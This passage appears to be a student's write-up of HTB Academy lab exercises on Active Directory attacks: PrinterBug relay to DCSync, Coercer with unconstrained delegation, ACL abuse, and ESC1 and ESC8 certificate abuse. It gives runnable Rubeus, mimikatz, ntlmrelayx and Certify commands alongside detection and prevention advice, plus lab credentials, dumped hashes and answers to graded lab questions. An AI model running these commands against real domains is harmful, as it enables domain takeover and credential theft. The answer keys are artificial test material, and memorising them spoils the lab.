2. Force a DC to connect to a machine with **Unconstrained Delegation**, then capture TGT using tools like **Rubeus** or **Mimikatz**.
3. Relay the connection to **Active Directory Certificate Services** to obtain a DC certificate.
4. Relay the connection to configure **Resource-Based Kerberos Delegation** and authenticate as any Administrator.

***

**Q1** What is Kerberos des-cbc-md5 key for user Administrator?

#### 1. Prepare `ntlmrelayx`

Run `ntlmrelayx` on Kali to relay connections to DC2 and perform DCSync:

```bash
sudo impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
```

#### 2. Trigger the PrinterBug with `dementor.py`

On Kali:

```bash
python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123
```

Output:

```
[*] Got expected RPC_S_SERVER_UNAVAILABLE exception. Attack worked
```

#### Capture Domain Credentials

`ntlmrelayx` performs DCSync and dumps credentials:

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FoUAMGPsOdp3FL651ws64%2FScreenshot%202025-09-13%20at%2010.14.30%E2%80%AFPM.png?alt=media&#x26;token=75348f45-9d9f-40c6-88f2-4798118be4a0" alt=""><figcaption></figcaption></figure>

Administrator:des-cbc-md5:d9b53b1f6d7c45a8\
krbtgt:des-cbc-md5:580229010b15b52f\
DC2$:des-cbc-md5:8fad7525b9cbc47f

### Prevention

To prevent PrinterBug attacks:

1. **Disable Print Spooler** on all non-print servers (especially Domain Controllers).
2. If the service must remain running, disable the remote RPC endpoint:

* Registry key:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers
RegisterSpoolerRemoteRpcEndPoint = 2  (DWORD 32-bit)
```

* `1` = enabled, `2` = disabled

3. Restart DC1 after the registry change.

***

### Detection

* Exploiting the PrinterBug generates network connections to the Domain Controller, but these are too generic for detection alone.
* When performing DCSync via NTLMRelayx, **no Event ID 4662** is generated.
* Correlate all logon attempts from core servers with known static IPs to detect suspicious behavior.

***

### Honeypot Option

* Block outbound connections from servers to ports **139** and **445**.
* Any attempt to exploit PrinterBug will fail, but blocked connections can act as **alerts** for blue teams.

**Answer : d9b53b1f6d7c45a8**



**Q2** After performing the previous attack, connect to DC1 (172.16.18.3) as 'htb-student:HTB\_@cademy\_stdnt!' and make the appropriate change to the registry to prevent the PrinterBug attack. Then, restart DC1 and try the same attack again. What is the error message seen when running dementor.py?

After changing `RegisterSpoolerRemoteRpcEndPoint = 2` and restarting DC1, running `dementor.py` again produces:

```
[-] unhandled exception occured: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
```

**Answer : \[-] unhandled exception occured: SMB SessionError: STATUS\_OBJECT\_NAME\_NOT\_FOUND(The object name is not found.)**



## Coercing Attacks & Unconstrained Delegation

### 1. Overview

Coercing attacks are a method to escalate privileges from any domain user to **Domain Administrator** by exploiting vulnerable RPC functions in Active Directory (AD).\
Nearly every organization with default AD settings is potentially vulnerable.

* Example: **PrinterBug** attack
* Multiple RPC functions can coerce authentication to other machines
* **Coercer** tool automates exploiting all known vulnerable RPC functions

***

### 2. Follow-up Attack Options

After a successful coercion, an attacker can perform:

1. **Relay connection to a Domain Controller**
   * Perform **DCSync** if **SMB Signing** is disabled
2. **Force the DC to connect to a machine configured for Unconstrained Delegation (UD)**
   * TGT of the DC will be cached in memory of the UD server
   * Can be captured/exported using **Rubeus** or **Mimikatz**
3. **Relay to Active Directory Certificate Services**
   * Obtain a DC certificate to impersonate the Domain Controller
4. **Configure Resource-Based Kerberos Delegation**
   * Authenticate as any Administrator on the target machine

> In this lab, we use option **2**, leveraging WS001 (UD server) to capture the DC’s TGT.

***

### 3. Identify Unconstrained Delegation Servers

Use **PowerView** to find UD-configured systems:

```powershell
Get-NetComputer -Unconstrained | select samaccountname
```

**output:**

| samaccountname |
| -------------- |
| DC1$           |
| SERVER01$      |
| WS001$         |
| DC2$           |

* Domain Controllers are trusted by default
* Targets for attack: WS001 or SERVER01
* In this lab: WS001 (already compromised, with admin rights)

***

### 4. Monitor TGT with Rubeus

On WS001, monitor new logons and extract TGTs:

```powershell
.\Rubeus.exe monitor /interval:1
```

**Example output:**

* User: `bob@EAGLE.LOCAL`
* Ticket Flags: `name_canonicalize, pre_authent, initial, renewable, forwardable`
* Base64 encoded ticket provided

> Rubeus monitors every second for new TGTs.

***

### 5. Execute Coercer

1. Determine WS001 IP address (`ipconfig`)
2. On Kali, run Coercer:

```bash
Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
```

**What Coercer does:**

* Analyzes accessible protocols on `dc1.eagle.local`
* Performs RPC calls to coerce authentication to `ws001.eagle.local`
* Checks pipes: `\PIPE\lsarpc`, `\PIPE\netdfs`, `\PIPE\spoolss`
* Errors like `ERROR_BAD_NETPATH` indicate successful coercion

***

### 6. Capture DC TGT on WS001

Rubeus on WS001 shows the DC1 TGT:

* User: `DC1$@EAGLE.LOCAL`
* Ticket Flags: `forwardable, forwarded, renewable, name_canonicalize`
* Base64 encoded ticket ready for use

> This TGT can authenticate within the domain as the Domain Controller.

***

### 7. Import TGT with Rubeus

```powershell
.\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
```

* Verify with `klist`
* Now we can perform **DCSync** and other privileged attacks

***

### 8. DCSync Attack

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
```

**Output includes:**

* SAM Username: `Administrator`
* NTLM hash: `fcdc65703dd2b0bd789977f1f3eeaecf`
* Kerberos keys, supplemental credentials

> With the DC TGT, all domain credentials can be accessed.

***

### 9. Prevention

1. **RPC Firewall (e.g., Zero Networks)**
   * Block dangerous RPC functions
   * Audit mode for monitoring
   * Update config for newly discovered vulnerable RPC functions
2. **Block outbound traffic from DC/core servers**
   * Block ports **139 and 445** except for required AD communication
   * Prevents attacker from receiving coerced TGTs

> This also protects against newly discovered RPC functions and coercing methods.

***

### 10. Detection

* Monitor firewall logs for unexpected outbound connections from DC to attacker machine
* Signs of suspicious activity: blocked outbound traffic to ports 139/445
* RPC Firewall can provide immediate detection

**Example behavior:**

* Incoming connections to DC port 445 from attacker
* Outbound connections from DC to attacker port 445
* If blocked, dropped traffic indicates suspicious activity

***

### Key Takeaways

* Coercing attacks relay authentication via vulnerable RPC functions
* Unconstrained Delegation servers are prime targets
* Tools: **Rubeus**, **Coercer**, **Mimikatz**
* Prevention: RPC firewall, block outbound 139/445
* Detection: monitor firewall logs for unexpected traffic

## Object ACLs

### 1. Overview

In Active Directory (AD), **Access Control Lists (ACLs)** are tables or lists that define which trustees have access to a specific object and their type of access.

* **Trustee:** Any security principal (user account, group, or login session)
* **Access Control Entry (ACE):** Defines the trustee and type of access
* **Securable Object:** Any named AD object with a security descriptor containing ACLs
* ACLs are also used for **auditing**, recording access attempts and access types.

**Example:**\
By default, Domain Admins can modify passwords of all objects. Delegated rights can allow specific users to:

* Reset passwords
* Modify group memberships
* Delete objects

> Large organizations should have clear processes to revoke rights when user roles change to prevent abuse.

#### Real-world examples of misconfigurations

* All Domain Users added as Administrators on all servers
* Everyone can modify all objects (full rights)
* All Domain Users can access computers’ extended properties containing LAPS passwords

***

### 2. Attack Scenario

To identify potentially abusable ACLs, we can use **BloodHound** and **SharpHound**.

**SharpHound Collection Example:**

```powershell
PS C:\Users\bob\Downloads> .\SharpHound.exe -c All
```

Output shows enumeration of objects in AD:

```
Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
Enumeration finished in 00:00:48
Happy Graphing!
```

* The generated **ZIP file** can be visualized in **BloodHound**.
* Focus on **escalation paths originating from the compromised user** (Bob).

#### Example: Bob's privileges

Bob has **GenericAll** permissions over:

1. **User Anni**
2. **Computer Server01**

**Implications:**

* **Case 1:** Full rights over user Anni
  * Bob can modify Anni’s object (e.g., add SPN) → perform Kerberoasting
  * Bob can reset Anni’s password → log in as Anni → inherit her privileges
* **Case 2:** Full control over a computer object
  * If LAPS is used, Bob can obtain the local Administrator password
  * Bob can use Resource-Based Kerberos Delegation → authenticate as any user on Server01
  * If Server01 is trusted for Unconstrained Delegation → potential escalation to Domain Controller

**Tooling:**

* **ADACLScanner:** Create reports of DACLs and SACLs for auditing

***

### 3. Prevention

1. Conduct **continuous assessment** to detect misconfigured ACLs
2. Educate privileged employees on proper ACL management
3. **Automate access management:**
   * Assign privileged access only to administrative accounts
   * Avoid manual edits by unprivileged users

***

### 4. Detection

#### Event IDs to monitor

* **4738:** User account was changed (e.g., Bob modifies Anni)
* **4724:** Password reset by a non-privileged user
* **4742:** Computer object modified (e.g., Bob modifies Server01)

**Limitations:**

* Events often do not show exact property changes
* SPN additions or minor attribute changes may not be fully visible

#### Honeypot strategy

* Create a **honeypot user** with high ACLs or fake credentials
* Any unauthorized change triggers alert (Event ID 4738)
* Optionally, disable the user performing changes and start a forensic investigation immediately

***

### Key Takeaways

* Misconfigured ACLs can allow **privilege escalation** in AD
* Tools: **BloodHound**, **SharpHound**, **ADACLScanner**
* Prevention: continuous assessment, education, automated privileged access
* Detection: monitor event IDs and use honeypot accounts to catch attackers



## PKI ESC1

### Overview

This lab demonstrates the ESC1 (Escalation 1) attack against Active Directory Certificate Services (AD CS). ESC1 exploits misconfigured certificate templates that allow domain users to request certificates for any user, including privileged accounts like Administrator.

### Prerequisites

1. VPN connection established
2. Wait 7-10 minutes after spawning the lab before requesting certificates
3. Basic understanding of Active Directory and PKI concepts

### Attack Description

ESC1 leverages the following misconfigurations:

* No issuance requirements
* Enrollable Client Authentication/Smart Card Logon OID templates
* `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled
* Domain Users have enrollment permissions

### Step-by-Step Attack

#### Step 1: Initial Access

1.  Connect to Kali host:

    ```bash
    # RDP to Kali host
    Target: 10.129.203.165
    Username: kali
    Password: kali
    ```
2.  From Kali, discover and connect to WS001:

    ```bash
    # Scan for Windows machines
    nmap -sn 172.16.18.0/24

    # RDP to WS001
    xfreerdp /v:<WS001_IP> /u:bob /p:Slavi123 /cert-ignore
    ```

#### Step 2: Enumerate PKI Infrastructure

On WS001, use Certify to scan for vulnerable certificate templates:

```powershell
PS C:\Users\bob\Downloads> .\Certify.exe find /vulnerable
```

**Expected Output:**

```
[!] Vulnerable Certificates Templates :
    CA Name                     : PKI.eagle.local\eagle-PKI-CA
    Template Name               : UserCert
    Schema Version              : 4
    Validity Period             : 10 years
    msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT
    pkiextendedkeyusage         : Client Authentication, Smart Card Log-on
    Enrollment Rights           : EAGLE\Domain Users
```

#### Step 3: Request Malicious Certificate

Request a certificate for the Administrator user:

```powershell
PS C:\Users\bob\Downloads> .\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
```

**Key Points:**

* Current user context: EAGLE\bob
* Template: UserCert
* AltName: Administrator (this allows impersonation)

#### Step 4: Convert Certificate Format

The certificate is generated in PEM format and needs conversion to PFX:

1.  Clean up PEM formatting:

    ```bash
    sed -i 's/\s\s\+/\n/g' cert.pem
    ```
2.  Convert to PFX format:

    ```bash
    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
    ```

    _Note: Press Enter when prompted for password (leave empty)_

#### Step 5: Authenticate with Certificate

Use Rubeus to request a Kerberos TGT with the certificate:

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
```

**Successful Output Indicators:**

* `[+] TGT request successful!`
* `[+] Ticket successfully imported!`
* UserName: Administrator
* ServiceName: krbtgt/eagle.local

#### Step 6: Access Domain Controller

With Administrator privileges, access the DC's C$ share:

```powershell
PS C:\Users\bob\Downloads> dir \\dc1\c$
```

**Expected Folders:**

* DFSReports
* Mimikatz
* PerfLogs
* Program Files
* Program Files (x86)
* scripts
* Users
* Windows

#### Step 7: Retrieve the Flag

Access the scripts directory to find the flag:

```powershell
PS C:\Users\bob\Downloads> dir \\dc1\c$\scripts
PS C:\Users\bob\Downloads> type \\dc1\c$\scripts\flag.txt
```

### Lab Questions

#### Question 1: Flag Retrieval

**Task:** What is the flag value located at `\\dc1\c$\scripts`?

**Steps:**

1. Complete the ESC1 attack as described above
2. Access `\\dc1\c$\scripts` directory
3. Read the flag file

#### Question 2: Certificate Request Timeline

**Task:** After performing the ESC1 attack, connect to PKI (172.16.18.15) as 'htb-student:HTB\_@cademy\_stdnt!' and look at the logs. On what date was the very first certificate requested and issued?

**Steps:**

1.  RDP to PKI server:

    ```
    Target: 172.16.18.15
    Username: htb-student
    Password: HTB_@cademy_stdnt!
    ```
2.  Check Windows Event Logs for certificate events:

    ```powershell
    # From Kali, establish PSSession to PKI
    New-PSSession PKI
    Enter-PSSession PKI

    # Query certificate request events (Event ID 4886)
    Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}

    # Query certificate issued events (Event ID 4887)
    Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4887'}

    # Get detailed information
    $events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
    $events[0] | Format-List -Property *
    ```
3. Look for the earliest TimeCreated timestamp

### Detection and Prevention

#### Detection Methods

1. **Event Log Monitoring:**
   * Event ID 4886: Certificate request received
   * Event ID 4887: Certificate issued
   * Event ID 4768: Kerberos TGT request with certificate
2. **Certificate Authority Monitoring:**
   * Review issued certificates with `certutil -view`
   * Look for unusual Subject Alternative Names (SANs)
3. **Template Analysis:**
   * Regular Certify scans: `.\Certify.exe find /vulnerable`
   * Monitor for templates with `ENROLLEE_SUPPLIES_SUBJECT` flag

#### Prevention Strategies

1. **Remove CT\_FLAG\_ENROLLEE\_SUPPLIES\_SUBJECT flag** from certificate templates
2. **Require manager approval** for certificate issuance
3. **Implement proper template permissions**
4. **Regular PKI security audits**

### Key Learning Points

1. **Certificate Authentication Advantages:**
   * Valid for extended periods (1+ years)
   * Password resets don't invalidate certificates
   * Can be used for persistent access
2. **ESC1 Prerequisites:**
   * Domain user enrollment rights
   * Client Authentication EKU
   * ENROLLEE\_SUPPLIES\_SUBJECT flag
   * No approval required
3. **Attack Impact:**
   * Domain privilege escalation
   * Long-term persistence
   * Difficult to detect without proper monitoring

### Troubleshooting

#### Common Issues

1. **Certificate Request Fails:**
   * Ensure 7-10 minutes have passed since lab start
   * Verify network connectivity to PKI server
   * Check user permissions
2. **TGT Request Fails:**
   * Verify PFX conversion was successful
   * Check domain controller connectivity
   * Ensure certificate contains correct SAN
3. **Access Denied Errors:**
   * Confirm TGT was imported successfully
   * Verify Administrator privileges with `whoami`
   * Check Kerberos ticket with `klist`

#### Network Troubleshooting

```bash
# From Kali host
ping 172.16.18.15  # PKI server
nmap -p 445 dc1.eagle.local  # DC SMB port
nslookup eagle.local  # DNS resolution
```

**Q1** Connect to the Kali host first, then RDP to WS001 as 'bob:Slavi123' and practice the techniques shown in this section. What is the flag value located at \dc1\c$\scripts?

**Answer : Pk1\_Vuln3r@b!litY**

**Q2** After performing the ESC1 attack, connect to PKI (172.16.18.15) as 'htb-student:HTB\_@cademy\_stdnt!' and look at the logs. On what date was the very first certificate requested and issued?

**Answer : 12-19-2022**



## Skills Assessment

### Overview

In this lab, we perform a certificate attack against Active Directory Certificate Services (ADCS) by abusing NTLM relaying techniques. This is commonly referred to as the ESC8 attack. The goal is to coerce a Domain Controller to request a certificate, then use that certificate to obtain a TGT and eventually perform DCSync.

***

### Attack Steps

#### 1. Set up NTLMRelayx

Configure NTLMRelayx to forward incoming connections to the HTTP endpoint of the Certificate Authority (CA). Request a certificate for the Domain Controller using the default template:

```bash
impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp \
    --template DomainController --smb2support --adcs
```

Notes:

* `--adcs` tells NTLMRelayx to parse and display received certificates.
* The server listens for incoming connections from coerced machines.

#### 2. Coerce the Domain Controller

Force a connection from the Domain Controller (DC2) to the Kali host using the Print Spooler bug:

```
python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123
```

* `172.16.18.20` → Target (DC2)
* `172.16.18.4` → Attacker (Kali)

> If the network address is invalid, verify IPs and connectivity.
>
> #### 3. Certificate Obtained
>
> Once DC2 connects, NTLMRelayx will relay the authentication and request a certificate:
>
> ```
> [*] GOT CERTIFICATE! ID 48
> [*] Base64 certificate of user DC2$: MIIRbQIBAzCC...
> ```
>
> Copy the Base64 certificate for later use with Rubeus.
>
>
>
> #### 4. Use Certificate to Request TGT
>
> On the Windows machine, use Rubeus to request a TGT with the obtained certificate:
>
> ```powershell
> .\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:<Base64Cert>
> ```
>
> * Successful TGT request confirms we can impersonate DC2.
>
>
>
> #### 5. Perform DCSync with Mimikatz
>
> With the TGT, perform DCSync to dump password hashes:
>
> ```powershell
> .\mimikatz_trunk\x64\mimikatz.exe "lsadump::dcsync /user:Administrator" exit
> ```
>
> * The NTLM hash of Administrator is now available for further attacks.
>
>
>
> ### Detection and Prevention
>
> #### Detection
>
> 1.  **Event 4886** – Certificate request by a user via ADCS relay.
>
>     ```
>     Requester: EAGLE\DC2$
>     Template: DomainController
>     ```
> 2. **Event 4887** – Certificate issuance for relayed request.
> 3. **Event 4768** – TGT requested using certificate from unexpected IP.
> 4. **Event 4624** – Successful login from unexpected IP.
>
> #### Prevention
>
> * Enforce HTTPS on ADCS web enrollment.
> * Regularly scan for relay vulnerabilities using tools like Certify.
> * Monitor for unusual certificate requests and authentications.
>
> **Requester field from Event 4886**
>
> **Q1** Replicate the attack described in this section and view the related 4886 and 4887 logs. Enter the name shown in the Requester field as your answer. (Format: EAGLE....)
>
> **Answer : EAGLE\DC2$**
